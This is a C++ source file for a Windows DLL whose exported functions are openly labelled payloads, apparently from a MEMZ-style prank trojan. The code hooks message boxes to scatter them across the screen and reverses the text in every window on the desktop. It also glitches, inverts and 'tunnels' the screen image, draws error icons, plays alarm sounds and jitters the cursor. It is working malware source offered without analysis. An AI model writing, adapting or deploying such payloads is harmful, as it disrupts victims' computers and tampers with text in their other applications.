#include <Windows.h>

#define PAYLOAD extern "C" __declspec(dllexport) void
#define ACTION PAYLOAD

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD reason, LPVOID unused);
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam);

PAYLOAD payloadMessageBox(LPWSTR text, LPWSTR label, int style);
PAYLOAD payloadReverseText();
PAYLOAD payloadSound();
PAYLOAD payloadGlitch();
PAYLOAD payloadTunnel();
PAYLOAD payloadDrawErrors();
PAYLOAD payloadInvertScreen();
PAYLOAD payloadCursor(int power);

ACTION clearWindows();

void strReverseW(LPWSTR str);
int random();

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD reason, LPVOID unused) {
	return TRUE;
}

const char *sounds[] = {
	"SystemHand",
	"SystemQuestion",
	"SystemExclamation"
};

PAYLOAD payloadMessageBox(LPWSTR text, LPWSTR label, int style) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, text, label, style);
	UnhookWindowsHookEx(hook);
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (GetSystemMetrics(SM_CXSCREEN) - pcs->cx);
			int y = random() % (GetSystemMetrics(SM_CYSCREEN) - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

PAYLOAD payloadReverseText() {
	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		strReverseW(str);
		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
	}

	GlobalFree(str);

	return TRUE;
}

PAYLOAD payloadSound() {
	PlaySoundA(sounds[random() % (sizeof(sounds)/sizeof(char *))], GetModuleHandle(NULL), SND_ASYNC);
}

PAYLOAD payloadGlitch() {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);

	int x1 = random() % (rekt.right - 100);
	int y1 = random() % (rekt.bottom - 100);
	int x2 = random() % (rekt.right - 100);
	int y2 = random() % (rekt.bottom - 100);
	int width = random() % 600;
	int height = random() % 600;

	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
	ReleaseDC(hwnd, hdc);
}

PAYLOAD payloadTunnel() {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
	ReleaseDC(hwnd, hdc);
}

PAYLOAD payloadDrawErrors() {
	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);

	POINT cursor;
	GetCursorPos(&cursor);

	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

	if (random() % 4 == 0) {
		DrawIcon(hdc, random() % GetSystemMetrics(SM_CXSCREEN), random() % GetSystemMetrics(SM_CYSCREEN), LoadIcon(NULL, IDI_WARNING));
	}

	ReleaseDC(hwnd, hdc);
}

PAYLOAD payloadInvertScreen() {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
	ReleaseDC(hwnd, hdc);
}

PAYLOAD payloadCursor(int power) {
	POINT cursor;
	GetCursorPos(&cursor);

	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (power)), cursor.y + (random() % 3 - 1) * (random() % (power)));
}

ACTION clearWindows() {
	EnumWindows(&CleanWindowsProc, NULL);
}

BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam) {
	DWORD pid;
	if (GetWindowThreadProcessId(hwnd, &pid) && pid == GetCurrentProcessId()) {
		SendMessage(hwnd, WM_CLOSE, 0, 0);
	}
	return TRUE;
}

void strReverseW(LPWSTR str) {
	int len = lstrlenW(str);

	if (len <= 1)
		return;

	WCHAR c;
	int i, j;
	for (i = 0, j = len - 1; i < j; i++, j--) {
		c = str[i];
		str[i] = str[j];
		str[j] = c;
	}

	// Fix Newlines
	for (i = 0; i < len - 1; i++) {
		if (str[i] == L'\n' && str[i + 1] == L'\r') {
			str[i] = L'\r';
			str[i + 1] = L'\n';
		}
	}
}

HCRYPTPROV prov;

int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
	return out & 0x7fffffff;
}